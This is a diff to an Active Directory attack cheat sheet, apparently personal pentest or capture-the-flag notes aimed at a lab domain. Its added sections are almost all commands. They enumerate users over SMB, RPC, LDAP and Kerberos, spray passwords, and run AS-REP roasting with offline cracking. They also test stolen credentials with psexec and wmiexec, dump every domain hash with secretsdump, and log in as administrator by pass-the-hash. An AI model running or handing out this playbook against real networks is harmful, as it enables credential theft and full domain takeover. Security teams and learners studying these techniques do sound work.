@@ -161,6 +161,52 @@ ldapsearch -v -x -D bob@mike.com -w paxxword -b "DC=mike,DC=com" -H "ldap://192.
 
 
 ===================================
+Hunt for Usernames
+
+Find usernames in Samba Docs
+smbclient -N -L //192.168.200.5/
+crackmapexec smb 192.168.200.5 -u guest -p "" --shares
+crackmapexec smb 192.168.200.5 -u guest -p "" --shares -M spider_plus
+smbclient -N  //192.168.200.5/shared
+get docwithusers.txt
+
+Find usernames from RPC
+rpcclient -U "" 192.168.200.5
+r> enumdomusers
+
+Find users via LDAP (anonymous)
+ldapsearch -x -h 192.168.200.5 -b base namingcontext
+
+Find Domain users on box
+lookupsid.py -no-pass mike.com 
+lookupsid.py mike.com/guest@192.168.200.5 > domusers.txt
+
+Remove the domain prefix
+cat domusers.txt | grep -i user | awk -F \\ '{print $2}'| awk '{print $1}'
+
+vim allusers.txt
+Johnny Leet
+Tony Skids
+Jack Goldenhand
+Alexa Whitehat
+Administrator  ..add manually
+Guest          ..add manually
+
+Mangle More Users
+https://github.com/PinkDraconian/CTF-bash-tools
+ctf-wordlist-names allusers.txt
+
+Check for Valid AD Users
+kerbrute userenum -d mike.com --dc 192.168.200.5 formatted_name_wordlist.txt
+
+asrep-roastable
+Crack Users that dont require creds to request TGT from the KDC
+impacket-GetNPUsers mike.com/ -no-pass -usersfile users.txt
+john --wordlist=$rockyou asrephash.txt
+
+
+
+===================================
 Easy Roast (needs creds/hash/ticket) 
 
 echo "192.168.200.5 mike.com" >> /etc/hosts  
@@ -177,23 +223,11 @@ gMSADumper.py -u 'mike' -p paxxword -d mydom.htb
 Silver Ticket 
 
 getST.py -spn www/dc.mike.com -impersonate Administrator domain/svc_gmsa$   
- 
-===================================
-Get Usernames 
 
-lookupsid.py -no-pass mike.com 
-lookupsid.py domain/guest@192.168.200.5
-lookupsid.py domain/Administrator:"Paxxword1\!"@192.168.200.5
-  
-
-===================================
-Test a Userlist 
-
-kerbrute userenum --dc 192.168.200.5 -d mike.com users.txt 
 
  
 ===================================
-Brute for ASREP Roastable Users 
+ASREP Roastable Users (no creds needed)
 
 GetNPUsers.py domain/bob
 GetNPUsers.py domain/ -no-pass -usersfile userlist.txt  
@@ -218,6 +252,32 @@ hashcat --example-hashes | grep kerb -B2 -A2
 hashcat -m 18200 hash.txt $rockyou  
 hashcat -m 13100 -a 0 khash0.txt $rockyou --force    
 
+
+===================================
+Got Creds
+
+Lookup Usernnames
+lookupsid.py mike.com/bob:"paxxword1\!"@192.168.200.5
+
+Check Samba Again
+crackmapexec smb 10.10.111.177 -u bob -p "paxx" -M spider_plus
+
+Cred Test
+crackmapexec smb 192.168.200.5 -u jimmy -p "hacked"
+psexec mike.com/jimmy@192.168.200.5
+wmiexec mike.com/jimmy@192.168.200.5
+
+Spray
+kerbrute passwordspray --dc 192.168.200.5 -d mydomain users.txt 'Paxxword'
+crackmapexec smb 192.168.200.5 -u bob -p Paxxword --shares    
+
+All Hashes
+secretsdump mike.com/jimmy@192.168.200.5
+
+Finally
+wmiexec mike.com/administrator@192.168.200.5 -hashes abc123:abc123
+
+
 =================================== 
 Bloodhound 
 
@@ -228,6 +288,10 @@ PS> Import-Module .\SharpHound.ps1
 PS> Invoke-BloodHound -CollectionMethod All 
 SharpHound.exe --CollectionMethod All  
 copy 20220118140920_BloodHound.zip \\192.168.162.46\share\  
+
+Remote Bloodhound (needs creds)
+bloodhound.py -c All,LoggedOn -u "bob" -p "paxx" -d mike.com -ns 192.168.200.5
+
 
 ===================================  
 Mimikatz/PTH/GetDC 
@@ -280,20 +344,6 @@ Get-DomainSID
 Get-DomainPolicy 
 Get-NetDomainController 
 Get-NetGPO 
-
-===================================
-AD  
-
-Check if AD username valid   
-kerbrute userenum --dc 192.168.200.5 -d 192.168.200.5 users.txt   
-kerbrute userenum --dc 192.168.200.5 -d mydomain users.txt   
-kerbrute passwordspray --dc 192.168.200.5 -d mydomain users.txt 'Paxxword'
-crackmapexec smb 192.168.200.5 -u bob -p Paxxword --shares    
-
-Usernames  
-List of Users > Convert to usernames  
-https://github.com/PinkDraconian  
-Then Kerbrute, if you get a list of users.  
   
   
 ==================================  
